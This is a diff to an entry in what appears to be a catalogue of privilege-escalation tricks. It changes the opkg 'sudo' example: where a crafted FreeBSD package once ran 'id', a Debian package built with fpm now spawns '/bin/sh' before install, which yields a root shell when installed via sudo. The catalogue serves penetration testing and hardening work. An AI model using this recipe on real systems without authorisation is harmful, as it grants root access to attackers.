@@ -2,12 +2,12 @@
 functions:
   sudo:
     - description: |
-        It runs commands using a specially crafted FreeBSD package. Generate it with [fpm](https://github.com/jordansissel/fpm) and upload it to the target.
+        It runs an interactive shell using a specially crafted Debian package. Generate it with [fpm](https://github.com/jordansissel/fpm) and upload it to the target.
         ```
         TF=$(mktemp -d)
-        echo 'id' > $TF/x.sh
-        fpm -n x -s dir -t freebsd -a all --before-install $TF/x.sh $TF
+        echo 'exec /bin/sh' > $TF/x.sh
+        fpm -n x -s dir -t deb -a all --before-install $TF/x.sh $TF
         ```
       code: |
-        sudo opkg install -y --no-repo-update ./x-1.0.txz
+        sudo opkg install x_1.0_all.deb
 ---
